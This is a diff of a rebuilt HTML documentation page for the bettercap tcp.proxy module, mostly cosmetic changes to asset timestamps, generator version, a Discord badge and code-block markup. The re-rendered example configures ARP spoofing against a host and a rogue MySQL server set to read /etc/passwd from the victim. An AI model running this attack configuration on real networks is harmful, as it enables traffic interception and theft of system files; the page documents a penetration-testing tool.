@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.128.2">
     <meta name="description" content="">
 
 
@@ -12,22 +12,22 @@
     <title>tcp.proxy :: bettercap</title>
 
     
-    <link href="/css/nucleus.css?1618232426" rel="stylesheet">
-    <link href="/css/fontawesome-all.min.css?1618232426" rel="stylesheet">
-    <link href="/css/hybrid.css?1618232426" rel="stylesheet">
-    <link href="/css/featherlight.min.css?1618232426" rel="stylesheet">
-    <link href="/css/perfect-scrollbar.min.css?1618232426" rel="stylesheet">
-    <link href="/css/auto-complete.css?1618232426" rel="stylesheet">
-    <link href="/css/atom-one-dark-reasonable.css?1618232426" rel="stylesheet">
-    <link href="/css/theme.css?1618232426" rel="stylesheet">
-    <link href="/css/tabs.css?1618232426" rel="stylesheet">
-    <link href="/css/hugo-theme.css?1618232426" rel="stylesheet">
+    <link href="/css/nucleus.css?1720991455" rel="stylesheet">
+    <link href="/css/fontawesome-all.min.css?1720991455" rel="stylesheet">
+    <link href="/css/hybrid.css?1720991455" rel="stylesheet">
+    <link href="/css/featherlight.min.css?1720991455" rel="stylesheet">
+    <link href="/css/perfect-scrollbar.min.css?1720991455" rel="stylesheet">
+    <link href="/css/auto-complete.css?1720991455" rel="stylesheet">
+    <link href="/css/atom-one-dark-reasonable.css?1720991455" rel="stylesheet">
+    <link href="/css/theme.css?1720991455" rel="stylesheet">
+    <link href="/css/tabs.css?1720991455" rel="stylesheet">
+    <link href="/css/hugo-theme.css?1720991455" rel="stylesheet">
     
-    <link href="/css/theme-green.css?1618232426" rel="stylesheet">
+    <link href="/css/theme-green.css?1720991455" rel="stylesheet">
     
     
 
-    <script src="/js/jquery-3.3.1.min.js?1618232426"></script>
+    <script src="/js/jquery-3.3.1.min.js?1720991455"></script>
 
     <style>
       :root #header + #content > #left > #rlblock_left{
@@ -120,6 +120,11 @@ a.highlight span.copy-to-clipboard {
 </a>
 </center>
 
+<p align="center">
+  <a href="https://discord.gg/btZpkp45gQ" target="_blank" title="Join our community!">
+    <img src="https://dcbadge.limes.pink/api/server/https://discord.gg/btZpkp45gQ"/>
+  </a>
+</p>
     </div>
     
         <div class="searchbox">
@@ -128,14 +133,14 @@ a.highlight span.copy-to-clipboard {
     <span data-search-clear=""><i class="fas fa-times"></i></span>
 </div>
 
-<script type="text/javascript" src="/js/lunr.min.js?1618232426"></script>
-<script type="text/javascript" src="/js/auto-complete.js?1618232426"></script>
+<script type="text/javascript" src="/js/lunr.min.js?1720991455"></script>
+<script type="text/javascript" src="/js/auto-complete.js?1720991455"></script>
 <script type="text/javascript">
     
         var baseurl = "https:\/\/bettercap.org\/";
     
 </script>
-<script type="text/javascript" src="/js/search.js?1618232426"></script>
+<script type="text/javascript" src="/js/search.js?1720991455"></script>
 
     
   </div>
@@ -1058,7 +1063,7 @@ a.highlight span.copy-to-clipboard {
   
     
     <li data-nav-id="/modules/ethernet/proxies/tcp.proxy/" title="tcp.proxy" class="dd-item
-        parent
+        
         active
         
         ">
@@ -1594,17 +1599,17 @@ a.highlight span.copy-to-clipboard {
 </table>
 <h3 id="modules">Modules</h3>
 <p>The <code>tcp.proxy</code> module can be scripted using javascript files that must declare at least one of the following functions:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// called when the script is loaded
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onLoad</span>() {
-
-}
-
-<span style="color:#75715e">// called when data is available
-</span><span style="color:#75715e">// return an array of bytes to override &#34;data&#34;
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onData</span>(<span style="color:#a6e22e">from</span>, <span style="color:#a6e22e">to</span>, <span style="color:#a6e22e">data</span>) {
-
-}
-</code></pre></div><p>Modules can change the <code>data</code> buffer and return it, signaling the proxy to override the original buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// called when the script is loaded
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onLoad</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// called when data is available
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// return an array of bytes to override &#34;data&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onData</span>(<span style="color:#a6e22e">from</span>, <span style="color:#a6e22e">to</span>, <span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Modules can change the <code>data</code> buffer and return it, signaling the proxy to override the original buffer.</p>
 <h3 id="builtin-functions">Builtin Functions</h3>
 <p>Modules can use the following builtin functions.</p>
 <table>
@@ -1679,28 +1684,28 @@ a.highlight span.copy-to-clipboard {
 </table>
 <h3 id="examples">Examples</h3>
 <p>The <a href="https://github.com/bettercap/caplets/blob/master/rogue-mysql-server.cap">rogue-mysql-server.cap</a> executes an ARP spoofing attack against a single host and redirect the MySQL traffic to a <a href="/modules/ethernet/servers/mysql.server/">builtin rogue server</a>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># set the target for arp spoofing</span>
-set arp.spoof.targets 192.168.1.236
-
-<span style="color:#75715e"># bind rogue mysql server to localhost and</span>
-<span style="color:#75715e"># set the file we want to read</span>
-set mysql.server.address 127.0.0.1
-set mysql.server.port <span style="color:#ae81ff">3306</span>
-set mysql.server.infile /etc/passwd
-mysql.server on
-
-<span style="color:#75715e"># set the ip from the mysql server we want to impersonate</span>
-set tcp.address 93.184.216.34
-set tcp.port <span style="color:#ae81ff">3306</span>
-
-<span style="color:#75715e"># set the ip from the rogue mysql server</span>
-set tcp.tunnel.address 127.0.0.1
-set tcp.tunnel.port <span style="color:#ae81ff">3306</span>
-
-<span style="color:#75715e"># go ^_^</span>
-tcp.proxy on
-arp.spoof on
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># set the target for arp spoofing</span>
+</span></span><span style="display:flex;"><span>set arp.spoof.targets 192.168.1.236
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># bind rogue mysql server to localhost and</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># set the file we want to read</span>
+</span></span><span style="display:flex;"><span>set mysql.server.address 127.0.0.1
+</span></span><span style="display:flex;"><span>set mysql.server.port <span style="color:#ae81ff">3306</span>
+</span></span><span style="display:flex;"><span>set mysql.server.infile /etc/passwd
+</span></span><span style="display:flex;"><span>mysql.server on
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># set the ip from the mysql server we want to impersonate</span>
+</span></span><span style="display:flex;"><span>set tcp.address 93.184.216.34
+</span></span><span style="display:flex;"><span>set tcp.port <span style="color:#ae81ff">3306</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># set the ip from the rogue mysql server</span>
+</span></span><span style="display:flex;"><span>set tcp.tunnel.address 127.0.0.1
+</span></span><span style="display:flex;"><span>set tcp.tunnel.port <span style="color:#ae81ff">3306</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># go ^_^</span>
+</span></span><span style="display:flex;"><span>tcp.proxy on
+</span></span><span style="display:flex;"><span>arp.spoof on
+</span></span></code></pre></div>
 
 
 
@@ -2496,19 +2501,19 @@ arp.spoof on
     <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
       <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
     </div>
-    <script src="/js/clipboard.min.js?1618232426"></script>
-    <script src="/js/perfect-scrollbar.min.js?1618232426"></script>
-    <script src="/js/perfect-scrollbar.jquery.min.js?1618232426"></script>
-    <script src="/js/jquery.sticky.js?1618232426"></script>
-    <script src="/js/featherlight.min.js?1618232426"></script>
-    <script src="/js/highlight.pack.js?1618232426"></script>
+    <script src="/js/clipboard.min.js?1720991455"></script>
+    <script src="/js/perfect-scrollbar.min.js?1720991455"></script>
+    <script src="/js/perfect-scrollbar.jquery.min.js?1720991455"></script>
+    <script src="/js/jquery.sticky.js?1720991455"></script>
+    <script src="/js/featherlight.min.js?1720991455"></script>
+    <script src="/js/highlight.pack.js?1720991455"></script>
     <script>hljs.initHighlightingOnLoad();</script>
-    <script src="/js/modernizr.custom-3.6.0.js?1618232426"></script>
-    <script src="/js/learn.js?1618232426"></script>
-    <script src="/js/hugo-learn.js?1618232426"></script>
+    <script src="/js/modernizr.custom-3.6.0.js?1720991455"></script>
+    <script src="/js/learn.js?1720991455"></script>
+    <script src="/js/hugo-learn.js?1720991455"></script>
     
         
-            <script src="/mermaid/mermaid.js?1618232426"></script>
+            <script src="/mermaid/mermaid.js?1720991455"></script>
         
         <script>
             mermaid.initialize({ startOnLoad: true });
